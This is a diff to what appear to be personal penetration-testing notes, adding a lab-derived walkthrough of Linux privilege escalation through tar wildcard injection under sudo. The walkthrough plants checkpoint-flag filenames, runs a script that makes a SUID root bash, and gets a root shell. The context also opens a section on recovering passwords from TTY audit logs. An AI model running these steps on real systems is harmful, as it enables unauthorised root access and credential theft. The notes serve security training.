@@ -688,6 +688,51 @@ See [[18. Linux Privilege Escalation|LPE.22]].
 
 ---
 
+## Sudo Tar Wildcard Injection
+
+When sudo allows `tar` with a bare `*` wildcard in a directory you can write to, plant filenames that tar interprets as flags.
+
+**Step 1 — Create payload script in the wildcard directory:**
+```bash
+cat > ~/privesc.sh << 'EOF'
+cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
+EOF
+chmod +x ~/privesc.sh
+```
+
+**Step 2 — Plant checkpoint filenames:**
+```bash
+echo "" > ~/'--checkpoint=1'
+echo "" > ~/'--checkpoint-action=exec=bash privesc.sh'
+```
+
+> ⚠️ Use `exec=bash privesc.sh` not `exec=./privesc.sh` or `exec=privesc.sh` — the checkpoint executor doesn't search CWD; `bash` resolves as an executable and then loads the script from CWD.
+> Cannot embed `/` in a filename — so absolute paths in exec= are not possible via this vector.
+
+**Step 3 — Trigger the sudo command:**
+```bash
+sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
+```
+
+**Step 4 — Root shell:**
+```bash
+ls -la /tmp/rootbash   # confirm: -rwsr-sr-x root root
+/tmp/rootbash -p
+whoami                 # root
+```
+
+**Cleanup:**
+```bash
+rm /tmp/rootbash ~/privesc.sh ~/'--checkpoint=1' ~/'--checkpoint-action=exec=bash privesc.sh'
+```
+
+> Source: Cockpit (PG Practice), [[PrivEsc Linux - Tar Wildcard]]
+> Reference: [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/)
+
+#### Tags: #TarWildcard #SudoMisconfiguration #WildcardInjection #LinuxPrivesc
+
+---
+
 ## aureport TTY Credential Hunt
 
 When you have shell access as a user in the `adm` group (or as root), Linux audit logs record all TTY input including passwords typed to `su`. `aureport --tty` decodes the audit records and prints them in readable form.
